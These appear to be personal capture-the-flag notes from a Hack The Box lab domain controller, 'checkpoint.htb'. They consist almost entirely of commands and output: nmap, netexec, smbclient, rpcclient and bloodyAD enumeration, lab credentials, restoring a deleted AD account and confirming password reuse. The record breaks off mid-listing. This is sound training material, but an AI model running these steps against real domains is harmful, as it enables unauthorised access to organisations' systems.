``` bash


❯ recon 10.129.83.15
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-27 19:54 +0200
Nmap scan report for 10.129.83.15
Host is up (0.037s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
49688/tcp open  unknown
49709/tcp open  unknown
49717/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.95 seconds
[*] First script done
[*] Open ports = '53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49669,49679,49680,49688,49709,49717'
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-27 19:55 +0200
Nmap scan report for 10.129.83.15
Host is up (0.040s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-08-28 00:54:16Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
49669/tcp open  msrpc             Microsoft Windows RPC
49679/tcp open  msrpc             Microsoft Windows RPC
49680/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc             Microsoft Windows RPC
49709/tcp open  msrpc             Microsoft Windows RPC
49717/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-08-28T00:55:09
|_  start_date: N/A
|_clock-skew: 6h59m06s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.99 seconds
[*] Done
╭─ ~/hacking/ctf/htb                                                                                      ✔ │ 2m 10s ─╮
╰─                                                                                                                   ─╯



```


![img](./img/Captura1.png)


``` bash

❯ netexec smb 10.129.83.15 -u 'alex.turner' -p 'Checkpoint2024!' --shares
SMB         10.129.83.15    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.83.15    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
SMB         10.129.83.15    445    DC01             [*] Enumerated shares
SMB         10.129.83.15    445    DC01             Share           Permissions     Remark
SMB         10.129.83.15    445    DC01             -----           -----------     ------
SMB         10.129.83.15    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.83.15    445    DC01             C$                              Default share
SMB         10.129.83.15    445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.83.15    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.83.15    445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.83.15    445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.83.15    445    DC01             VMBackups
╭─ ~/hacking/ctf/htb                                                                                          ✔ │ 6s ─╮
╰─                                                                                                                   ─╯

```


``` bash

❯ smbclient '//10.129.83.15/DevDrop' -U 'alex.turner'
Password for [WORKGROUP\alex.turner]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue May 26 23:45:01 2026
  ..                                  D        0  Sat May  9 16:42:27 2026

                10459391 blocks of size 4096. 2465216 blocks available
smb: \> exit
❯ smbclient '//10.129.83.15/IPC$' -U 'alex.turner'
Password for [WORKGROUP\alex.turner]:
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> exit
❯ smbclient '//10.129.83.15/NETLOGON' -U 'alex.turner'
Password for [WORKGROUP\alex.turner]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat May  9 10:39:17 2026
  ..                                  D        0  Sat May  9 10:42:23 2026

                10459391 blocks of size 4096. 2467797 blocks available
smb: \> exit
❯ smbclient '//10.129.83.15/SYSVOL' -U 'alex.turner'
Password for [WORKGROUP\alex.turner]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat May  9 10:39:17 2026
  ..                                  D        0  Sat May  9 10:39:17 2026
  checkpoint.htb                     Dr        0  Sat May  9 10:39:17 2026

                10459391 blocks of size 4096. 2467737 blocks available
smb: \> cd checkpoint.htb\
smb: \checkpoint.htb\> dir
  .                                   D        0  Sat May  9 10:42:23 2026
  ..                                  D        0  Sat May  9 10:39:17 2026
  DfsrPrivate                      DHSr        0  Sat May  9 10:42:23 2026
  Policies                            D        0  Sat May  9 10:39:34 2026
  scripts                             D        0  Sat May  9 10:39:17 2026

                10459391 blocks of size 4096. 2467737 blocks available
smb: \checkpoint.htb\>

```


``` bash

❯ mkdir -p sysvol
❯ smbclient //10.129.83.15/SYSVOL -U 'alex.turner' -c 'recurse ON; prompt OFF; lcd sysvol; mget *'
Password for [WORKGROUP\alex.turner]:
NT_STATUS_ACCESS_DENIED listing \checkpoint.htb\DfsrPrivate\*
getting file \checkpoint.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 22 as checkpoint.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \checkpoint.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as checkpoint.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \checkpoint.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2796 as checkpoint.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (17.7 KiloBytes/sec) (average 6.1 KiloBytes/sec)
getting file \checkpoint.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as checkpoint.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (7.3 KiloBytes/sec) (average 6.4 KiloBytes/sec)
getting file \checkpoint.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 4212 as checkpoint.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (27.1 KiloBytes/sec) (average 10.6 KiloBytes/sec)
❯ cd sysvol
❯ ls
checkpoint.htb
╭─ ~/hacking/ctf/htb/medium/checkpoint/recon/sysvol                                                                ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ tree
.
├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   ├── GPT.INI
│   ├── MACHINE
│   │   ├── Microsoft
│   │   │   └── Windows NT
│   │   │       └── SecEdit
│   │   │           └── GptTmpl.inf
│   │   └── Registry.pol
│   └── USER
└── {6AC1786C-016F-11D2-945F-00C04fB984F9}
    ├── GPT.INI
    ├── MACHINE
    │   └── Microsoft
    │       └── Windows NT
    │           └── SecEdit
    │               └── GptTmpl.inf
    └── USER

13 directories, 5 files
╭─ ~/hacking/ctf/htb/medium/checkpoint/recon/sysvol/checkpoint.htb/Policies                                        ✔ ─╮
╰─                                                                                                                   ─╯

```


``` bash

❯ rpcclient -U 'checkpoint.htb/alex.turner%Checkpoint2024!' 10.129.83.15
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[alex.turner] rid:[0x44d]
user:[ryan.brooks] rid:[0x44f]
user:[svc_deploy] rid:[0x450]
user:[james.harper] rid:[0x457]
user:[sarah.mitchell] rid:[0x458]
user:[emily.carter] rid:[0x459]
user:[david.reynolds] rid:[0x45a]
user:[jessica.coleman] rid:[0x45b]
user:[lauren.flores] rid:[0x45c]
user:[michael.torres] rid:[0x45d]
user:[kevin.patterson] rid:[0x45e]
user:[brian.jenkins] rid:[0x45f]
user:[megan.perry] rid:[0x460]
user:[max.palmer] rid:[0x13ed]
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[Forest Trust Accounts] rid:[0x210]
group:[External Trust Accounts] rid:[0x211]
group:[IT-Staff] rid:[0x451]
group:[Finance-Staff] rid:[0x452]
group:[HR-Staff] rid:[0x453]
group:[Engineering-Staff] rid:[0x454]
group:[VPN-Users] rid:[0x455]
group:[DevTeam] rid:[0x456]
group:[DnsUpdateProxy] rid:[0x462]
group:[BackupAccess] rid:[0x463]
rpcclient $>

```

``` bash

❯ bloodyAD --host 10.129.83.15 --dns 10.129.83.15 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
╭─ ~/hacking/ctf/htb/medium/checkpoint/recon/sysvol/checkpoint.htb/Policies                                   ✔ │ 3s ─╮
╰─                                                                                                                   ─╯

```


``` bash

❯ bloodyAD --host 10.129.83.15 --dns 10.129.83.15 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cn: Mark Davies
DEL:2217e877-e2a2-47d7-91d4-99ede36f367e
codePage: 0
countryCode: 0
dSCorePropagationData: 2026-05-10 13:38:56+00:00
givenName: Mark
instanceType: 4
isDeleted: True
lastKnownParent: OU=Employees,DC=checkpoint,DC=htb
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 1601-01-01 00:00:00+00:00
lastLogonTimestamp: 2026-05-10 13:30:28.285126+00:00
logonCount: 0
msDS-LastKnownRDN: Mark Davies
nTSecurityDescriptor: O:S-1-5-21-3129162710-3498938529-1807524340-512G:S-1-5-21-3129162710-3498938529-1807524340-512D:AI(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3129162710-3498938529-1807524340-517)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;0x30;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;0x30;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a54-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a56-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;;S-1-5-11)(OA;;RP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-11)(OA;;RP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;RP;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b2-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-512)(A;CI;0x20028;;;S-1-5-21-3129162710-3498938529-1807524340-1101)(A;;0xf01ff;;;S-1-5-32-548)(A;;RC;;;S-1-5-11)(A;;0x20094;;;S-1-5-10)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: Mark Davies
DEL:2217e877-e2a2-47d7-91d4-99ede36f367e
objectClass: top; person; organizationalPerson; user
objectGUID: 2217e877-e2a2-47d7-91d4-99ede36f367e
objectSid: S-1-5-21-3129162710-3498938529-1807524340-1102
primaryGroupID: 513
pwdLastSet: 2026-05-09 09:00:48.810500+00:00
sAMAccountName: mark.davies
sn: Davies
uSNChanged: 57667
uSNCreated: 12771
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
userPrincipalName: mark.davies@checkpoint.htb
whenChanged: 2026-05-10 14:44:12+00:00
whenCreated: 2026-05-09 09:00:48+00:00
╭─ ~/hacking/ctf/htb/medium/checkpoint/recon                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ bloodyAD --host 10.129.83.15 --dns 10.129.83.15 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore mark.davies
[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
╭─ ~/hacking/ctf/htb/medium/checkpoint/recon                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ if bloodyAD --host 10.129.83.15 --dns 10.129.83.15 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object mark.davies | grep -q "isDeleted"; then echo "no eliminado"; else echo "Objeto recuperado"; fi
Objeto recuperado
╭─ ~/hacking/ctf/htb/medium/checkpoint/recon                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ bloodyAD --host 10.129.83.74 --dns 10.129.83.74 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object mark.davies

distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cn: Mark Davies
codePage: 0
countryCode: 0
dSCorePropagationData: 2026-08-28 09:19:24+00:00
givenName: Mark
instanceType: 4
lastKnownParent: OU=Employees,DC=checkpoint,DC=htb
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 1601-01-01 00:00:00+00:00
lastLogonTimestamp: 2026-05-10 13:30:28.285126+00:00
logonCount: 0
msDS-LastKnownRDN: Mark Davies
nTSecurityDescriptor: O:S-1-5-21-3129162710-3498938529-1807524340-512G:S-1-5-21-3129162710-3498938529-1807524340-512D:AI(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3129162710-3498938529-1807524340-517)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;0x30;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;0x30;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a54-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a56-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;;S-1-5-11)(OA;;RP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-11)(OA;;RP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;RP;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b2-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-512)(A;CI;0x20028;;;S-1-5-21-3129162710-3498938529-1807524340-1101)(A;;0xf01ff;;;S-1-5-32-548)(A;;RC;;;S-1-5-11)(A;;0x20094;;;S-1-5-10)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: Mark Davies
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=checkpoint,DC=htb
objectClass: top; person; organizationalPerson; user
objectGUID: 2217e877-e2a2-47d7-91d4-99ede36f367e
objectSid: S-1-5-21-3129162710-3498938529-1807524340-1102
primaryGroupID: 513
pwdLastSet: 2026-05-09 09:00:48.810500+00:00
sAMAccountName: mark.davies
sAMAccountType: 805306368
sn: Davies
uSNChanged: 151649
uSNCreated: 12771
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
userPrincipalName: mark.davies@checkpoint.htb
whenChanged: 2026-08-28 09:19:24+00:00
whenCreated: 2026-05-09 09:00:48+00:00
╭─ ~/hacking/ctf/htb/medium/checkpoint/recon                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ bloodyAD --host 10.129.83.74 --dns 10.129.83.74 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get membership mark.davies

distinguishedName: CN=Users,CN=Builtin,DC=checkpoint,DC=htb
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Domain Users,CN=Users,DC=checkpoint,DC=htb
objectSid: S-1-5-21-3129162710-3498938529-1807524340-513
sAMAccountName: Domain Users
╭─ ~/hacking/ctf/htb/medium/checkpoint/recon                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

`Password reuse vulnerability`

``` bash

❯ netexec smb 10.129.83.74 -u 'mark.davies' -p 'Checkpoint2024!'
SMB         10.129.83.74    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.83.74    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
╭─ ~/hacking/ctf/htb/medium/checkpoint/recon                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ netexec winrm 10.129.83.74 -u 'mark.davies' -p 'Checkpoint2024!'
WINRM       10.129.83.74    5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb)
WINRM       10.129.83.74    5985   DC01             [-] checkpoint.htb\mark.davies:Checkpoint2024!
❯ netexec winrm 10.129.83.74 -u 'alex.turner' -p 'Checkpoint2024!'
WINRM       10.129.83.74    5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb)
WINRM       10.129.83.74    5985   DC01             [-] checkpoint.htb\alex.turner:Checkpoint2024!
╭─ ~/hacking/ctf/htb/medium/checkpoint/recon                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ bloodyAD --host 10.129.83.74 --dns 10.129.83.74 -d checkpoint.htb -u mark.davies -p 'Checkpoint2024!' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
╭─ ~/hacking/ctf/htb/medium/checkpoint/recon                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ netexec smb 10.129.83.74 -u 'mark.davies' -p 'Checkpoint2024!' --shares
SMB         10.129.83.74    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.83.74    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
SMB         10.129.83.74    445    DC01             [*] Enumerated shares
